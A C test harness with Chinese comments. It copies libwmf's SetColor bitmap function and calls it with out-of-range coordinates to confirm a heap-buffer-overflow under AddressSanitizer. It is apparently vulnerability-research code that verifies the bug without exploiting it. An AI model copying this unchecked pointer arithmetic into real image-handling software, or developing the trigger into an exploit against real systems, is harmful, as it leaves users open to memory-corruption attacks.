// 直接调用 libwmf 的 SetColor 函数测试漏洞
// 编译: gcc -fsanitize=address -g -O1 -I./example/libwmf/include test_libwmf_setcolor.c -o test_libwmf_setcolor

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 从 libwmf 源码复制的结构体定义
typedef struct {
    unsigned char r, g, b;
} wmfRGB;

typedef struct {
    unsigned char* image;
    unsigned int bytes_per_line;
    unsigned int bits_per_pixel;
    unsigned int NColors;
    wmfRGB* rgb;
    int flipped;
} BMPData;

typedef struct {
    void* data;
    unsigned int width;
    unsigned int height;
} wmfBMP;

// 从 example/libwmf/src/ipa/ipa/bmp.h:1303 复制的 SetColor 函数
static void SetColor(void* API, wmfBMP* bmp, wmfRGB* rgb, unsigned char opacity, unsigned int x, unsigned int y)
{
    BMPData* data = (BMPData*)bmp->data;
    unsigned char* p;

    if (data->flipped) y = (bmp->height - 1) - y;

    switch (data->bits_per_pixel)
    {
    case 8:
        p = data->image + (y * data->bytes_per_line) + x;
        printf("[*] Writing to offset: %lu (x=%u, y=%u)\n",
               (unsigned long)(p - data->image), x, y);
        *p = 0xFF;  // 触发越界写入
        break;
    }
}

int main() {
    printf("=== 测试 libwmf SetColor 漏洞 (真实源码) ===\n\n");

    // 设置位图
    wmfBMP bmp;
    BMPData data;

    bmp.width = 100;
    bmp.height = 100;
    bmp.data = &data;

    data.bits_per_pixel = 8;
    data.bytes_per_line = 100;
    data.image = (unsigned char*)malloc(100 * 100);  // 10000 bytes
    data.flipped = 0;

    printf("[*] 分配的缓冲区: %p (大小: 10000 bytes)\n", data.image);
    printf("[*] 位图尺寸: %ux%u\n", bmp.width, bmp.height);
    printf("[*] bytes_per_line: %u\n\n", data.bytes_per_line);

    wmfRGB color = {255, 0, 0};

    // 测试 1: 正常访问
    printf("[TEST 1] 正常访问 (x=50, y=50)\n");
    SetColor(NULL, &bmp, &color, 0, 50, 50);
    printf("[+] 成功\n\n");

    // 测试 2: 越界 - 超出宽度
    printf("[TEST 2] 越界访问 (x=200, y=50) - 超出宽度\n");
    SetColor(NULL, &bmp, &color, 0, 200, 50);
    printf("[+] 如果没有 ASAN 错误，说明写入成功但越界了\n\n");

    // 测试 3: 越界 - 超出高度
    printf("[TEST 3] 越界访问 (x=50, y=200) - 超出高度\n");
    SetColor(NULL, &bmp, &color, 0, 50, 200);
    printf("[+] 如果没有 ASAN 错误，说明写入成功但越界了\n\n");

    // 测试 4: 极端越界
    printf("[TEST 4] 极端越界 (x=10000, y=10000)\n");
    SetColor(NULL, &bmp, &color, 0, 10000, 10000);
    printf("[+] 如果没有 ASAN 错误，说明写入成功但越界了\n\n");

    printf("[!] 如果启用了 ASAN，应该在 TEST 2/3/4 看到 heap-buffer-overflow\n");

    free(data.image);
    return 0;
}
